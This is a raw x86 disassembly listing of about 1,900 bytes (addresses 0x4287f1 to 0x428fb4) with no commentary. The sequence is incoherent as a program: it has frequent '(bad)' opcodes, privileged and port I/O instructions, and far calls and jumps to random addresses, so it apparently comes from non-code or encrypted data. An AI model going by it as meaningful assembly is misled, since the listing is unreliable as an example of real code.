  4287f1:	mov    eax,ds:0x4ec7327b
  4287f6:	push   esp
  4287f7:	or     ah,0x60
  4287fa:	mov    edx,0xb69058b3
  4287ff:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  428801:	adc    eax,0x62a4bee3
  428806:	sbb    al,0x4c
  428808:	pop    edx
  428809:	aas    
  42880a:	arpl   WORD PTR [ecx+eiz*1],sp
  42880d:	cdq    
  42880e:	sahf   
  42880f:	inc    ecx
  428810:	mov    ch,0x50
  428812:	ret    
  428813:	jecxz  0x428805
  428815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428816:	mov    ebx,DWORD PTR [ebx+0x1]
  428819:	pop    edi
  42881a:	dec    ebx
  42881b:	enter  0x5b28,0x10
  42881f:	jg     0x42884c
  428821:	inc    edx
  428822:	nop
  428823:	adc    eax,0xe77c7d9d
  428828:	popf   
  428829:	cdq    
  42882a:	dec    ebx
  42882b:	cld    
  42882c:	mov    ds:0x865d762b,eax
  428831:	mov    dl,BYTE PTR [bp-0x47]
  428835:	ret    
  428836:	ret    0xc104
  428839:	mov    dh,0xda
  42883b:	sub    DWORD PTR [ecx],ebx
  42883d:	test   al,0xfb
  42883f:	xor    dh,al
  428841:	icebp  
  428842:	sbb    bl,BYTE PTR [edi]
  428844:	sqrtps xmm4,xmm2
  428847:	pop    esp
  428848:	(bad)
  42884b:	cmc    
  42884c:	cli    
  42884d:	sbb    ebx,DWORD PTR [edx+eax*1+0x1f]
  428851:	xchg   ebp,eax
  428852:	lock jp 0x42884a
  428855:	adc    eax,0xed7eebc7
  42885a:	repnz (bad) 
  42885c:	(bad)  
  42885d:	leave  
  42885e:	pop    ecx
  42885f:	cdq    
  428860:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428861:	mov    ds:0x2589c6d3,eax
  428866:	pop    esp
  428867:	cmp    DWORD PTR [edi-0x1d],esp
  42886a:	pop    edi
  42886b:	aam    0xed
  42886d:	(bad)  
  42886f:	std    
  428870:	xor    eax,0xb9d78a8
  428875:	cli    
  428876:	cdq    
  428877:	fsubp  st(0),st
  428879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42887a:	daa    
  42887b:	lds    esp,FWORD PTR [ebx+0x75098213]
  428881:	mov    ds:0x4876e8f8,eax
  428886:	int    0x4c
  428888:	fild   QWORD PTR [edx-0x36dd9498]
  42888e:	das    
  42888f:	sub    bl,BYTE PTR ds:0x55b4e30f
  428895:	pop    ds
  428896:	or     al,0xe6
  428898:	repz int 0x13
  42889b:	jns    0x4288c1
  42889d:	test   eax,0xe875bde3
  4288a2:	in     al,0x49
  4288a4:	push   eax
  4288a5:	cmp    dl,BYTE PTR [ebx-0x77]
  4288a8:	inc    ebp
  4288a9:	pusha  
  4288aa:	pop    edx
  4288ab:	call   0x38364eb6
  4288b0:	fmul   st,st(0)
  4288b2:	outs   dx,DWORD PTR ds:[esi]
  4288b3:	ins    BYTE PTR es:[edi],dx
  4288b4:	repnz cld 
  4288b6:	xlat   BYTE PTR ds:[ebx]
  4288b7:	xor    al,0xf5
  4288b9:	sar    DWORD PTR [ecx],1
  4288bb:	lods   al,BYTE PTR ds:[esi]
  4288bc:	bound  ebx,QWORD PTR [ebx+edi*8-0x701bea3b]
  4288c3:	xor    DWORD PTR [edi+0xea618f3],0x2dd52029
  4288cd:	mov    DWORD PTR [ecx+0x271860f8],esp
  4288d3:	xor    al,0xe5
  4288d5:	mov    eax,ds:0x2a258e0b
  4288da:	mov    ecx,0xb7490c9a
  4288df:	push   eax
  4288e0:	sbb    eax,0xc294b7ee
  4288e5:	xchg   ecx,eax
  4288e6:	xor    eax,0xc52b3522
  4288eb:	repz adc BYTE PTR [esp+edx*1-0x6cb6e574],dl
  4288f3:	pop    esi
  4288f4:	dec    ebx
  4288f5:	mov    al,ds:0xa1c0ce14
  4288fa:	cmp    eax,DWORD PTR [eax-0x308e028c]
  428900:	ds jb  0x4288f8
  428903:	jp     0x4288d8
  428905:	ds mov bh,0x54
  428908:	in     eax,0xc0
  42890a:	add    dh,bh
  42890c:	adc    eax,0xbdef9e91
  428911:	fsub   st(4),st
  428913:	mov    bl,0xfe
  428915:	cli    
  428916:	jbe    0x4288c7
  428918:	(bad)  
  428919:	aad    0x5
  42891b:	jl     0x42893b
  42891d:	je     0x4288b0
  42891f:	ins    BYTE PTR es:[edi],dx
  428920:	je     0x4288f6
  428922:	jnp    0x428937
  428924:	jns    0x4288d8
  428926:	js     0x428968
  428928:	and    DWORD PTR [edi-0x12],esi
  42892b:	(bad)  
  42892c:	cli    
  42892d:	push   0xfffffffc
  42892f:	je     0x42894b
  428931:	mov    DWORD PTR [ecx],ecx
  428933:	xor    DWORD PTR [eax-0x49878ff3],ebx
  428939:	pop    es
  42893a:	dec    ebx
  42893b:	adc    eax,0x77c92a72
  428940:	pop    esp
  428941:	in     al,dx
  428942:	mov    eax,0xbfbda7de
  428947:	add    al,0x89
  428949:	inc    ebp
  42894a:	loop   0x428922
  42894c:	add    eax,0x21b33ba3
  428951:	push   0x287ff1b8
  428956:	pop    DWORD PTR [eax]
  428958:	sbb    BYTE PTR [ecx],cl
  42895a:	mov    WORD PTR [edx+edx*4],gs
  42895d:	ins    DWORD PTR es:[edi],dx
  42895e:	pop    ecx
  42895f:	inc    esi
  428960:	repz test DWORD PTR [edi+ebx*2-0x6d],edi
  428965:	fwait
  428966:	push   esi
  428967:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428968:	lods   al,BYTE PTR ds:[esi]
  428969:	scas   al,BYTE PTR es:[edi]
  42896a:	mov    edx,0xc9daf9f2
  42896f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428970:	sbb    DWORD PTR [ebp-0x3e8c3e11],ebp
  428976:	rcr    ebx,0x45
  428979:	cmp    al,0x8c
  42897b:	hlt    
  42897c:	mov    DWORD PTR [edx-0x36e16a0d],ebp
  428982:	cmc    
  428983:	ins    BYTE PTR es:[edi],dx
  428984:	inc    eax
  428985:	adc    eax,0x95fa48e0
  42898a:	sub    al,0x2a
  42898c:	ds push eax
  42898e:	test   bl,bl
  428990:	push   esi
  428991:	mov    ch,0xbf
  428993:	push   eax
  428994:	and    eax,esp
  428996:	xchg   ebp,eax
  428997:	xor    al,BYTE PTR [ecx+0x17]
  42899a:	mov    esp,0xacc65bb4
  42899f:	jg     0x4289f6
  4289a1:	outs   dx,DWORD PTR ds:[esi]
  4289a2:	jecxz  0x42898d
  4289a4:	push   0xffffff8d
  4289a6:	or     al,0xb0
  4289a8:	cli    
  4289a9:	call   0xf312:0xb51d1518
  4289b0:	dec    esp
  4289b1:	xor    dl,BYTE PTR [edi-0x2fa7592e]
  4289b7:	aad    0x1d
  4289b9:	push   edi
  4289ba:	sbb    eax,0xcf963538
  4289c0:	je     0x4289d7
  4289c2:	loope  0x428948
  4289c4:	inc    esi
  4289c5:	sub    BYTE PTR [eax],cl
  4289c7:	mov    es,ecx
  4289c9:	mov    ds:0x2283bddb,eax
  4289ce:	jmp    0x428a00
  4289d0:	mov    cl,0x47
  4289d2:	mov    esi,0xb8f25233
  4289d7:	hlt    
  4289d8:	push   edx
  4289d9:	(bad)  
  4289da:	(bad)  
  4289dc:	xchg   ebp,eax
  4289dd:	add    eax,0x2818ec8c
  4289e2:	lods   al,BYTE PTR ds:[esi]
  4289e3:	sar    BYTE PTR [ebp+0x6b],cl
  4289e6:	call   0xb59ba1e2
  4289eb:	aad    0x47
  4289ed:	add    ecx,DWORD PTR [ecx+0x29]
  4289f0:	es mov ebp,0x9eced91b
  4289f6:	cs cmp ebx,esi
  4289f9:	dec    esp
  4289fa:	mov    esi,0xb50786b3
  4289ff:	hlt    
  428a00:	int    0xcd
  428a02:	cmp    cl,BYTE PTR ds:0xe996bab5
  428a08:	fs pushf 
  428a0a:	dec    eax
  428a0b:	(bad)  
  428a0c:	push   ds
  428a0d:	mov    ebp,edx
  428a0f:	call   0xa72a:0x71df3fcf
  428a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428a17:	fwait
  428a18:	cmc    
  428a19:	cwde   
  428a1a:	jg     0x428a17
  428a1c:	inc    esp
  428a1d:	sahf   
  428a1e:	mov    edx,0xd2a8928e
  428a23:	cmp    eax,0x5aa19924
  428a28:	sub    DWORD PTR [edi],edx
  428a2a:	push   0x936f8afc
  428a2f:	nop
  428a30:	mov    ebp,0x5883dba1
  428a35:	in     al,dx
  428a36:	add    al,0x4c
  428a38:	mov    ebx,0x84918cb5
  428a3d:	sar    BYTE PTR [eax],1
  428a3f:	shr    BYTE PTR [ebx-0x739b4fbb],1
  428a45:	mov    dh,ah
  428a47:	cmp    esp,DWORD PTR [ebp-0x19148e5c]
  428a4d:	popa   
  428a4e:	iret   
  428a4f:	mov    bh,0x17
  428a51:	imul   esp,DWORD PTR [ecx],0xff1965d1
  428a57:	call   0x66de:0x65ab9ffc
  428a5e:	adc    al,0xf0
  428a60:	imul   edi,ecx,0xffffffe9
  428a63:	sub    DWORD PTR [eax],esp
  428a65:	imul   edx,DWORD PTR [eax+0x5b0313ec],0xdba574e9
  428a6f:	hlt    
  428a70:	and    bx,cx
  428a73:	mov    ds:0x5c7172d1,al
  428a78:	aas    
  428a79:	ret    
  428a7a:	mov    dl,0x54
  428a7c:	dec    ebx
  428a7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a7e:	ins    BYTE PTR es:[edi],dx
  428a7f:	iret   
  428a80:	out    0x63,al
  428a82:	pop    ecx
  428a83:	pusha  
  428a84:	push   es
  428a85:	test   al,0x6d
  428a87:	fcomp  QWORD PTR [eax-0xc415d93]
  428a8d:	inc    esi
  428a8e:	mov    al,0xd4
  428a90:	stos   DWORD PTR es:[edi],eax
  428a91:	out    dx,al
  428a92:	jb     0x428b08
  428a94:	test   DWORD PTR [ebx-0x612e152d],esi
  428a9a:	inc    edi
  428a9b:	mov    ds:0x3a7d3918,eax
  428aa0:	and    bl,bl
  428aa2:	pop    es
  428aa3:	dec    edi
  428aa4:	xchg   ebp,eax
  428aa5:	mov    ebx,0xbf90257b
  428aaa:	ret    0x2212
  428aad:	jno    0x428b09
  428aaf:	bound  esp,QWORD PTR [ecx-0x20]
  428ab2:	xchg   ecx,eax
  428ab3:	test   al,0xbc
  428ab5:	scas   al,BYTE PTR es:[edi]
  428ab6:	mov    eax,0x977bf264
  428abb:	pop    ss
  428abc:	out    0xc2,al
  428abe:	push   ecx
  428abf:	pop    ds
  428ac0:	xchg   ecx,eax
  428ac1:	pop    ebp
  428ac2:	repz test BYTE PTR [esi+0x2d],0xbb
  428ac7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ac8:	pop    ss
  428ac9:	nop
  428aca:	pop    ecx
  428acb:	mov    edx,esi
  428acd:	retf   0x3fc
  428ad0:	clc    
  428ad1:	cmp    ebp,DWORD PTR [eax+ebp*8+0x2]
  428ad5:	mov    ecx,0x35e9e4e0
  428ada:	mov    al,0x44
  428adc:	in     eax,0xd2
  428ade:	jb     0x428a6b
  428ae0:	push   es
  428ae1:	fdivr  QWORD PTR [ebx-0x5f]
  428ae4:	sub    BYTE PTR [ecx+0x78],cl
  428ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ae8:	icebp  
  428ae9:	test   al,0x7
  428aeb:	pop    ss
  428aec:	sbb    bh,cl
  428aee:	test   BYTE PTR [edi*4-0x7c4c94fe],0xb9
  428af6:	stos   DWORD PTR es:[edi],eax
  428af7:	sub    al,0x69
  428af9:	(bad)  
  428afa:	xor    ch,BYTE PTR [edi+0x18]
  428afd:	add    eax,0x60bea8bc
  428b02:	xor    DWORD PTR [edi-0x7b420fde],esp
  428b08:	push   edi
  428b09:	push   edi
  428b0a:	loop   0x428b7d
  428b0c:	adc    eax,0x26eca194
  428b11:	inc    edx
  428b12:	sbb    esi,DWORD PTR [edi+edx*1-0x67]
  428b16:	jne    0x428b57
  428b18:	add    BYTE PTR [edx+ecx*1],ch
  428b1b:	jno    0x428b08
  428b1d:	call   0x1ce7:0x1c398adb
  428b24:	sub    ebx,0xffffffa2
  428b27:	retf   
  428b28:	push   ss
  428b29:	test   eax,0x926e4c81
  428b2e:	out    dx,eax
  428b2f:	sub    DWORD PTR ds:0x79686ba6,esp
  428b35:	hlt    
  428b36:	xor    esp,DWORD PTR [ebx]
  428b38:	pop    esi
  428b39:	adc    eax,0xd6e558e3
  428b3e:	mov    ecx,0x3efb3d84
  428b43:	stc    
  428b44:	ja     0x428b25
  428b46:	stos   DWORD PTR es:[edi],eax
  428b47:	stos   DWORD PTR es:[edi],eax
  428b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b49:	or     DWORD PTR [ebx+0x71361f],ebx
  428b4f:	ror    bl,0xa4
  428b52:	mov    esp,0x795adda8
  428b57:	push   esp
  428b58:	xchg   esp,eax
  428b59:	(bad)  [eax-0x4f]
  428b5c:	and    al,0x74
  428b5e:	jmp    0x7be3291f
  428b63:	xor    al,0x3
  428b65:	mov    eax,0x921a653c
  428b6a:	mov    al,0x46
  428b6c:	pop    edx
  428b6d:	cmp    BYTE PTR [edx+0x55fda204],bh
  428b73:	inc    DWORD PTR [esi-0x9]
  428b76:	lds    edx,FWORD PTR [edi-0x3e]
  428b79:	call   0xd77d:0xf59e104a
  428b80:	xchg   edx,eax
  428b81:	inc    esi
  428b82:	cmp    al,0x16
  428b84:	lds    ebx,FWORD PTR [ebp+0x13]
  428b87:	sub    edx,DWORD PTR [ebp-0x6d]
  428b8a:	jnp    0x428b77
  428b8c:	out    dx,al
  428b8d:	ss and al,0x88
  428b90:	pop    ss
  428b91:	dec    ecx
  428b92:	add    esi,DWORD PTR [edx-0x65]
  428b95:	and    ebp,DWORD PTR [ebx]
  428b97:	xchg   DWORD PTR [ebp+0x14],ebp
  428b9a:	jl     0x428b62
  428b9c:	mov    esi,0x813ad93f
  428ba1:	and    ebp,eax
  428ba3:	out    dx,al
  428ba4:	push   edx
  428ba5:	fnstenv [esp+edi*2+0x34]
  428ba9:	cmp    dh,ch
  428bab:	sub    edx,DWORD PTR [eax+0x70]
  428bae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428baf:	in     al,dx
  428bb0:	mov    esp,0xa016103c
  428bb6:	cmp    eax,0x38f91947
  428bbb:	test   DWORD PTR [esi-0x648a0df],esi
  428bc1:	popf   
  428bc2:	sti    
  428bc3:	cli    
  428bc4:	fild   QWORD PTR [esi]
  428bc6:	mov    bh,0xba
  428bc8:	pop    edi
  428bc9:	xchg   esp,eax
  428bca:	loope  0x428c22
  428bcc:	adc    DWORD PTR [eax+0x140a6863],ebp
  428bd2:	arpl   WORD PTR [ebx+0x63],bp
  428bd5:	lahf   
  428bd6:	cmp    edi,DWORD PTR [edx+0x5b2b6c17]
  428bdc:	adc    BYTE PTR [esi-0x2ee38857],ah
  428be2:	stos   DWORD PTR es:[edi],eax
  428be3:	test   al,0xa8
  428be5:	call   0x1074a360
  428bea:	push   esp
  428beb:	jno    0x428c12
  428bed:	aad    0x33
  428bef:	out    dx,al
  428bf0:	jo     0x428bfd
  428bf2:	mov    ebx,0xabca0e23
  428bf7:	cmp    BYTE PTR [ecx+0x1b64459a],0x94
  428bfe:	jne    0x428c2d
  428c00:	add    eax,0xe0f53f85
  428c05:	pop    edi
  428c06:	dec    ebx
  428c07:	cdq    
  428c08:	pop    esp
  428c09:	push   ebx
  428c0a:	repz cld 
  428c0c:	pushf  
  428c0d:	mov    BYTE PTR [ebp+0x6a36359c],bh
  428c13:	jmp    0xc70306f1
  428c18:	and    DWORD PTR [ecx],ecx
  428c1a:	stos   BYTE PTR es:[edi],al
  428c1b:	sbb    al,BYTE PTR [edi+esi*1-0x5b1437cc]
  428c22:	jnp    0x428c7b
  428c24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c25:	lea    ebx,[eax]
  428c27:	xchg   esi,eax
  428c28:	jecxz  0x428baf
  428c2a:	sub    al,0x29
  428c2c:	lods   al,BYTE PTR ds:[esi]
  428c2d:	xchg   ebp,eax
  428c2e:	jl     0x428ca8
  428c30:	mov    ds:0xe64cdbb4,eax
  428c35:	daa    
  428c36:	cdq    
  428c37:	std    
  428c38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c39:	xchg   edi,eax
  428c3a:	enter  0x750a,0x1b
  428c3e:	jno    0x428c30
  428c40:	dec    esp
  428c41:	ja     0x428cbe
  428c43:	sbb    esp,DWORD PTR [ebx]
  428c45:	stc    
  428c46:	jmp    0xc35a:0x4919bd9b
  428c4d:	jl     0x428c39
  428c4f:	je     0x428c86
  428c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c52:	sahf   
  428c53:	repz push es
  428c55:	add    ch,0x6b
  428c58:	pop    ss
  428c59:	or     DWORD PTR [edi+0x40],esp
  428c5c:	sbb    esp,0xf
  428c5f:	xor    al,0x1d
  428c61:	popf   
  428c62:	imul   ebx,DWORD PTR ds:0xc7e73afd,0xffffffa0
  428c69:	dec    ebp
  428c6a:	and    esi,DWORD PTR [edi+ebx*1+0x56]
  428c6e:	mov    edi,0xd575c7d4
  428c73:	xor    eax,0xae967668
  428c78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c79:	cli    
  428c7a:	cmp    dh,al
  428c7c:	and    DWORD PTR [ecx+0x5bc0b144],esp
  428c82:	adc    eax,0xb86393a5
  428c87:	test   BYTE PTR [esi+0x5],bl
  428c8a:	test   edi,0xb46d05aa
  428c90:	sbb    eax,0x5f04c188
  428c95:	jecxz  0x428c9e
  428c97:	sbb    eax,0x95a19916
  428c9c:	stos   BYTE PTR es:[edi],al
  428c9d:	xchg   edi,eax
  428c9e:	add    al,0xe5
  428ca0:	sbb    esp,DWORD PTR [ebp+0x38e5ffb]
  428ca6:	push   cs
  428ca7:	stos   BYTE PTR es:[edi],al
  428ca8:	xchg   ecx,eax
  428ca9:	inc    edi
  428caa:	les    edi,FWORD PTR [esi-0x1b4d91c1]
  428cb0:	loop   0x428ca2
  428cb2:	shr    BYTE PTR [edi+0x25],cl
  428cb5:	pop    edx
  428cb6:	xlat   BYTE PTR ds:[ebx]
  428cb7:	out    0x6d,eax
  428cb9:	cmp    DWORD PTR [ebp-0x2b66e42b],eax
  428cbf:	sbb    edi,ebx
  428cc1:	push   ecx
  428cc2:	mov    al,BYTE PTR [edx-0x53746293]
  428cc8:	and    eax,0xb770672a
  428ccd:	iret   
  428cce:	stos   BYTE PTR es:[edi],al
  428ccf:	inc    ebx
  428cd0:	iret   
  428cd1:	int3   
  428cd2:	mov    ebp,0xffbeba14
  428cd7:	push   ecx
  428cd8:	sub    eax,ebp
  428cda:	out    0xcf,eax
  428cdc:	scas   eax,DWORD PTR es:[edi]
  428cdd:	stos   DWORD PTR es:[edi],eax
  428cde:	mov    dl,0xc
  428ce0:	int3   
  428ce1:	xchg   ebp,eax
  428ce2:	xor    al,0x56
  428ce4:	rcr    DWORD PTR [ecx-0x4b],0xb4
  428ce8:	and    al,0x1b
  428cea:	push   ebx
  428ceb:	into   
  428cec:	dec    ebp
  428ced:	mov    ds:0x770de549,eax
  428cf3:	call   0xa5b6916c
  428cf8:	test   dl,0x83
  428cfb:	into   
  428cfc:	sbb    al,0x29
  428cfe:	cs aad 0x62
  428d01:	pop    es
  428d02:	out    0xd7,eax
  428d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d05:	punpcklwd mm5,mm5
  428d08:	xor    DWORD PTR [ebx+esi*4+0x2950b36b],esp
  428d0f:	xchg   ecx,eax
  428d10:	fadd   DWORD PTR [edi-0x2ed32b45]
  428d16:	sbb    BYTE PTR [edx+0x219d8216],0x94
  428d1d:	loop   0x428d0b
  428d1f:	sbb    BYTE PTR [edx],bl
  428d21:	or     eax,0x82fc943a
  428d26:	cdq    
  428d27:	in     eax,0x77
  428d29:	jb     0x428d3b
  428d2b:	mov    esp,0xd4b6e38f
  428d30:	mov    DWORD PTR [ebp+0x3795a639],edi
  428d36:	shl    dl,cl
  428d38:	inc    eax
  428d39:	jmp    0x428d30
  428d3b:	pushf  
  428d3c:	push   ss
  428d3d:	dec    ecx
  428d3e:	push   edx
  428d3f:	push   0xb3897d97
  428d44:	out    dx,eax
  428d45:	mov    ds:0xb8c2832b,eax
  428d4a:	stos   DWORD PTR es:[edi],eax
  428d4b:	push   cs
  428d4c:	dec    eax
  428d4d:	mov    eax,ds:0x58cdb8a1
  428d52:	mov    ebp,0xb4333b84
  428d57:	pop    ebx
  428d58:	push   es
  428d59:	xor    al,0xde
  428d5b:	push   ss
  428d5c:	cdq    
  428d5d:	mov    bl,dh
  428d5f:	mov    DWORD PTR [ebp-0x32],0x6277bf3e
  428d66:	inc    eax
  428d67:	jne    0x428d5f
  428d69:	inc    ebx
  428d6a:	pop    ecx
  428d6b:	add    al,0x9f
  428d6d:	xchg   DWORD PTR [edi-0x745ffaf3],ecx
  428d73:	(bad)  
  428d74:	(bad)  [ebx]
  428d76:	imul   esi,esp,0x4fd210c9
  428d7c:	pop    ds
  428d7d:	jmp    0x428d38
  428d7f:	aam    0x7d
  428d81:	shl    BYTE PTR [edi-0x46],cl
  428d84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428d85:	(bad)  
  428d86:	push   es
  428d87:	jmp    0x91b:0x7060e5f2
  428d8e:	loope  0x428d8b
  428d90:	sub    eax,0x3cdcf564
  428d95:	jns    0x428dba
  428d97:	jno    0x428dc6
  428d99:	popf   
  428d9a:	jmp    0x428de9
  428d9c:	push   ss
  428d9d:	jo     0x428d2a
  428d9f:	mov    WORD PTR [edi+0xdfecc5a],fs
  428da5:	inc    esi
  428da6:	es adc eax,0xa421bf20
  428dac:	or     al,0xa5
  428dae:	cmp    eax,DWORD PTR [edi-0x12f5abe8]
  428db4:	lds    ebx,FWORD PTR [edx-0x65696d1d]
  428dba:	jnp    0x428db5
  428dbc:	xchg   BYTE PTR [esi],bl
  428dbe:	sti    
  428dbf:	call   0xdb4e359b
  428dc4:	hlt    
  428dc5:	lahf   
  428dc6:	jo     0x428dfc
  428dc8:	imul   esi,DWORD PTR [edx+0x54],0xbbf29922
  428dcf:	je     0x428dde
  428dd1:	cmp    DWORD PTR [edx+0x685326ff],ebp
  428dd7:	sbb    BYTE PTR [edi-0xb21482b],bh
  428ddd:	sar    BYTE PTR [ebp+ebx*2-0x1b451168],1
  428de4:	inc    esi
  428de5:	jle    0x428e57
  428de7:	xchg   edx,eax
  428de8:	in     eax,0x1d
  428dea:	add    ch,ch
  428dec:	fidiv  DWORD PTR [edx]
  428dee:	sbb    BYTE PTR [esi+0x23],bh
  428df1:	pop    ecx
  428df2:	xor    BYTE PTR [ebp+0x2],cl
  428df5:	(bad)  
  428df6:	mov    eax,edx
  428df8:	jmp    0x54684996
  428dfd:	mov    ebp,0x70cca632
  428e02:	daa    
  428e03:	ds sbb eax,0xe08c4759
  428e09:	inc    esi
  428e0a:	jmp    0xe47:0xfb9f905e
  428e11:	dec    edi
  428e12:	cld    
  428e13:	cs mov edx,0x32459f5b
  428e19:	dec    ecx
  428e1a:	mov    ebp,0x3274024b
  428e1f:	xchg   DWORD PTR [edi],ebx
  428e21:	cmp    BYTE PTR [ecx],dh
  428e23:	pop    edi
  428e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428e25:	pusha  
  428e26:	das    
  428e27:	sub    BYTE PTR [edx+ebx*4+0x1524fa9c],cl
  428e2e:	mov    ecx,0xd4b4b3f3
  428e33:	aam    0xe0
  428e35:	mov    ch,0x23
  428e37:	mov    ebp,0xae59e0ce
  428e3c:	ret    
  428e3d:	mov    dh,0x3b
  428e3f:	inc    ecx
  428e40:	addr16 out 0x7e,eax
  428e43:	cs ja  0x428de6
  428e46:	scas   al,BYTE PTR es:[edi]
  428e47:	and    al,0xc7
  428e49:	int3   
  428e4a:	in     eax,0xeb
  428e4c:	aad    0x7f
  428e4e:	adc    edi,ebp
  428e50:	or     al,0xdf
  428e52:	xchg   ecx,eax
  428e53:	pop    ds
  428e54:	add    eax,0xdde9dab7
  428e59:	(bad)  
  428e5a:	in     eax,0xdd
  428e5c:	pop    ss
  428e5d:	sub    DWORD PTR [edi],eax
  428e5f:	and    BYTE PTR [eax-0x64],dl
  428e62:	retf   0xf185
  428e65:	mov    eax,ds:0x7683a24b
  428e6a:	bound  ecx,QWORD PTR [ebp+0x5e2ceffd]
  428e70:	mov    ecx,DWORD PTR [ebp-0x3c037b50]
  428e76:	adc    DWORD PTR [ecx],edi
  428e78:	jne    0x428ef6
  428e7a:	xor    ebp,eax
  428e7c:	rcl    BYTE PTR [eax],cl
  428e7e:	pop    edx
  428e7f:	pop    ebx
  428e80:	and    al,0x99
  428e82:	ins    DWORD PTR es:[edi],dx
  428e83:	xchg   esp,eax
  428e84:	cmc    
  428e85:	sub    BYTE PTR [ebp-0x22],dh
  428e88:	shl    BYTE PTR [ebx+ebp*1-0x384adf82],1
  428e8f:	mov    esi,0xe2e06cef
  428e94:	cmp    esi,DWORD PTR [edi-0x20a4cb4f]
  428e9a:	and    ebp,DWORD PTR [ebp+0x55]
  428e9d:	fnstcw WORD PTR [eax]
  428e9f:	out    dx,eax
  428ea0:	jns    0x428ec9
  428ea2:	mov    ah,0x9e
  428ea4:	sbb    BYTE PTR [ecx],bh
  428ea6:	add    dh,bh
  428ea8:	inc    edx
  428ea9:	ffreep st(0)
  428eab:	add    bl,BYTE PTR [ebx-0x60]
  428eae:	imul   esi,DWORD PTR [ebx+0x10456fb5],0x10
  428eb5:	and    al,0xc4
  428eb7:	sub    BYTE PTR [edi],bh
  428eb9:	jp     0x428e6b
  428ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ebc:	stos   DWORD PTR es:[edi],eax
  428ebd:	repnz adc BYTE PTR [ebp+eiz*8-0x54104bfd],ah
  428ec5:	outs   dx,BYTE PTR ds:[esi]
  428ec6:	fst    QWORD PTR [ebx+0x25]
  428ec9:	mov    ecx,0x3f31c8ee
  428ece:	jecxz  0x428f3a
  428ed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ed1:	mov    edi,0x87b5013a
  428ed6:	cli    
  428ed7:	lock pop ebp
  428ed9:	scas   eax,DWORD PTR es:[edi]
  428eda:	jmp    0x6710:0x90f91ccb
  428ee1:	std    
  428ee2:	mov    esi,0xcba5f4ea
  428ee7:	push   eax
  428ee8:	leave  
  428ee9:	add    bh,BYTE PTR [esi]
  428eeb:	add    DWORD PTR [edi-0x61],ebx
  428eee:	add    ch,0x4e
  428ef1:	or     eax,0x254064b8
  428ef6:	adc    edi,DWORD PTR [ebx-0x2b]
  428ef9:	adc    DWORD PTR [ebp+0x37ed9bf4],ecx
  428eff:	ror    DWORD PTR [esi+0x67e6c225],1
  428f05:	inc    ebp
  428f06:	dec    ebx
  428f07:	outs   dx,BYTE PTR ds:[esi]
  428f08:	fiadd  WORD PTR [eax+esi*4]
  428f0b:	rol    ch,1
  428f0d:	ds pusha 
  428f0f:	test   BYTE PTR ds:0x72d118a5,0x9d
  428f16:	imul   BYTE PTR [edx+0x24b0c7d1]
  428f1c:	fild   DWORD PTR [esi+0x7ba56fde]
  428f22:	pop    ss
  428f23:	in     eax,dx
  428f24:	ficom  DWORD PTR [ecx-0x23]
  428f27:	mov    dh,0x98
  428f29:	nop
  428f2a:	xor    dl,BYTE PTR [edi+ebp*8+0x78]
  428f2e:	xlat   BYTE PTR ds:[ebx]
  428f2f:	add    al,0x8e
  428f31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428f32:	out    0x82,eax
  428f34:	xor    BYTE PTR [eax-0x759d46f4],dl
  428f3a:	cs fdiv st(0),st
  428f3d:	jb     0x428eef
  428f3f:	mov    dh,0x16
  428f41:	dec    ecx
  428f42:	xor    BYTE PTR [eax+0x1c],dl
  428f45:	sar    esp,cl
  428f47:	mov    al,BYTE PTR [ecx]
  428f49:	inc    edx
  428f4a:	sbb    al,0x21
  428f4c:	das    
  428f4d:	or     al,BYTE PTR [ebp-0x59]
  428f50:	jne    0x428ee2
  428f52:	sub    al,dh
  428f54:	call   0x18821dfa
  428f59:	sar    BYTE PTR [edx+0x27f5eaf4],0x5f
  428f60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f61:	jmp    0xac97a051
  428f66:	lahf   
  428f67:	in     eax,dx
  428f68:	push   edx
  428f69:	fldenv [esi+0x46]
  428f6c:	repz dec eax
  428f6e:	lods   eax,DWORD PTR ds:[esi]
  428f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428f70:	mov    bh,BYTE PTR [ebp-0x6e]
  428f73:	and    DWORD PTR ds:0xbcedb971,edx
  428f79:	std    
  428f7a:	xor    al,BYTE PTR [eax+ebx*1]
  428f7d:	fld    DWORD PTR [edi+0x76]
  428f80:	ror    ebx,1
  428f82:	mov    eax,ds:0xba7c370e
  428f87:	cli    
  428f88:	pop    ss
  428f89:	and    BYTE PTR [ebp+0x6c],dl
  428f8c:	mov    edx,0xa32f13c5
  428f91:	mov    eax,ds:0xf7f9d4b0
  428f96:	in     al,0x8c
  428f98:	test   DWORD PTR [edi+0x932a5cb],ebx
  428f9e:	inc    esi
  428f9f:	cmp    cl,BYTE PTR [ecx+0x29]
  428fa2:	push   es
  428fa3:	out    0x32,eax
  428fa5:	int    0xc5
  428fa7:	je     0x429015
  428fa9:	int    0x24
  428fab:	clc    
  428fac:	into   
  428fad:	popf   
  428fae:	push   ebp
  428faf:	pop    esp
  428fb0:	sar    dl,0x0
  428fb3:	push   esi
  428fb4:	xchg   BYTE PTR [ecx+0x46],ch
